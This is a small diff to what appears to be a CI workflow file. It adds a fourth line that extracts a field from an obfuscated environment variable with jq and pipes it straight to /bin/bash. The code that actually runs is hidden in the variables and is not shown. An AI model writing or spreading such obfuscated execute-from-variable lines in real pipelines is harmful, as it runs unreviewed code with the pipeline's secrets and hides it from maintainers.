@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$levk398" | jq -r .vn360 | /bin/bash
           echo $aupt2138 | jq -r .ywprk02 | /bin/bash
           echo $psm67337 | jq -r .y968 | /bin/bash
+          echo $am5 | jq -r .bidpy8365 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
